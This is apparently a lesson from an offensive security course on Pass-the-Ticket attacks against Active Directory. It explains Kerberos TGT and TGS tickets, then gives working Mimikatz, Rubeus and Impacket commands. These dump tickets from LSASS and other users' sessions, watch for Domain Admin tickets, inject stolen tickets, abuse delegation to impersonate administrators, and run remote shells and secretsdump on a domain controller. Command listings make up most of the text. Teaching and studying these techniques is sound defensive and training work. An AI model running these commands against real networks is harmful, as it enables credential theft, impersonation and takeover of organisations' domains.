# Pass-the-Ticket (PtT)

## Unit 4 - Topic 3 | Credential Attacks

---

## Overview

**Pass-the-Ticket (PtT)** attacks use stolen Kerberos tickets (TGT or TGS) to authenticate as another user without knowing their password or hash. Since Kerberos is the default authentication protocol in AD, this technique is highly effective and harder to detect than NTLM-based attacks.

---

## 1. Kerberos Tickets Explained

```
KERBEROS TICKET TYPES:

TGT (Ticket Granting Ticket):
├── Obtained during initial authentication
├── Encrypted with krbtgt hash
├── Grants ability to request service tickets
├── Valid for 10 hours (default), renewable for 7 days
└── THE KEY to the kingdom — grants access to ANY service

TGS (Ticket Granting Service ticket):
├── Requested using TGT
├── Encrypted with service account hash
├── Grants access to specific service
├── Valid for 10 hours (default)
└── More limited than TGT — single service access

TICKET LOCATIONS IN MEMORY:
Windows: LSASS process (lsass.exe)
Linux:   /tmp/krb5cc_* (ccache files)
```

---

## 2. Extracting Tickets

```bash
# === MIMIKATZ (Windows) ===
# List all Kerberos tickets in memory:
sekurlsa::tickets /export
# Exports .kirbi files to current directory
# Files named: [session]-[type]-[user]-[service].kirbi

# List tickets without exporting:
kerberos::list

# === RUBEUS (Windows — Preferred) ===
# List all tickets:
.\Rubeus.exe triage
# Shows all tickets in all logon sessions

# Dump specific ticket:
.\Rubeus.exe dump /user:admin /service:krbtgt
# Dumps TGT for admin user

# Dump all tickets:
.\Rubeus.exe dump
# Base64-encoded tickets in output

# === IMPACKET (Linux) ===
# Request TGT with password:
getTGT.py corp.local/admin:password -dc-ip dc01
# Output: admin.ccache

# Request TGT with hash:
getTGT.py corp.local/admin -hashes :NTLM_HASH -dc-ip dc01
# Output: admin.ccache (Kerberos ticket)

# === TICKET CONVERSION ===
# .kirbi (Windows) ↔ .ccache (Linux):
# kirbi → ccache:
ticketConverter.py ticket.kirbi ticket.ccache
# ccache → kirbi:
ticketConverter.py ticket.ccache ticket.kirbi
```

---

## 3. Injecting and Using Tickets

```bash
# === MIMIKATZ (Windows) ===
# Inject TGT into current session:
kerberos::ptt ticket.kirbi
# Now current session authenticates as ticket owner

# Verify:
klist
# Shows injected ticket

# Access resources:
dir \\dc01\c$
# Uses injected ticket for authentication

# === RUBEUS (Windows) ===
# Pass the ticket (base64):
.\Rubeus.exe ptt /ticket:base64_encoded_ticket

# Pass the ticket (.kirbi file):
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Request and inject in one step:
.\Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt
# Requests TGT and immediately injects it

# === IMPACKET (Linux) ===
# Set ticket for use:
export KRB5CCNAME=admin.ccache

# Use with Impacket tools:
psexec.py corp.local/admin@dc01 -k -no-pass
wmiexec.py corp.local/admin@dc01 -k -no-pass
smbexec.py corp.local/admin@dc01 -k -no-pass
secretsdump.py corp.local/admin@dc01 -k -no-pass
# -k: Use Kerberos authentication
# -no-pass: Don't prompt for password

# === SMBCLIENT (Linux) ===
export KRB5CCNAME=admin.ccache
smbclient //dc01/C$ -k -no-pass
```

---

## 4. PtT vs PtH Comparison

| Feature | Pass-the-Hash | Pass-the-Ticket |
|---------|:-------------:|:---------------:|
| **Protocol** | NTLM | Kerberos |
| **Credential** | NTLM hash | Kerberos ticket |
| **Lifetime** | Permanent (until password change) | 10 hours (ticket expiry) |
| **Detection** | Event 4624 Type 3 | Harder to detect |
| **Scope** | Any NTLM-enabled service | Depends on ticket type |
| **Blocked by** | Credential Guard | Credential Guard |
| **Stealth** | Moderate | Higher |

---

## 5. Harvesting Tickets from Other Sessions

```bash
# === STEAL TICKETS FROM OTHER USERS ===
# Requires: Local admin or SYSTEM on target

# Mimikatz — Dump ALL sessions' tickets:
privilege::debug
sekurlsa::tickets /export
# Exports every user's tickets on the system

# Rubeus — Monitor for new tickets:
.\Rubeus.exe monitor /interval:5 /filteruser:da_user
# Captures TGTs as users authenticate
# Great for catching Domain Admin TGTs!

# Rubeus — Harvest from specific session:
.\Rubeus.exe dump /luid:0x3e4
# Dumps tickets from specific logon session

# === UNCONSTRAINED DELEGATION ===
# Machines with unconstrained delegation store
# TGTs for all authenticating users!
# If you compromise such a machine:
sekurlsa::tickets /export
# → Get TGTs for Domain Admins who connected!

# === CONSTRAINED DELEGATION ABUSE ===
# If an account has constrained delegation:
.\Rubeus.exe s4u /user:svc_sql /rc4:HASH \
  /impersonateuser:administrator \
  /msdsspn:cifs/target.corp.local /ptt
# Impersonates administrator to access target
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **TGT** | Universal ticket — access any service |
| **TGS** | Service-specific ticket |
| **Mimikatz** | `kerberos::ptt` to inject tickets |
| **Rubeus** | Modern ticket extraction and injection |
| **Impacket** | Linux-based: export KRB5CCNAME + -k flag |
| **Conversion** | ticketConverter.py for .kirbi ↔ .ccache |
| **Stealth** | PtT is harder to detect than PtH |

---

## Quick Revision Questions

1. **What is the difference between a TGT and a TGS?**
2. **How do you inject a Kerberos ticket on Windows?**
3. **How do you use a ticket with Impacket tools on Linux?**
4. **Why is PtT considered stealthier than PtH?**
5. **How does unconstrained delegation enable ticket theft?**

---

[← Previous: Pass-the-Hash](02-pass-the-hash.md) | [Next: Kerberoasting →](04-kerberoasting.md)

---

*Unit 4 - Topic 3 of 6 | [Back to README](../README.md)*
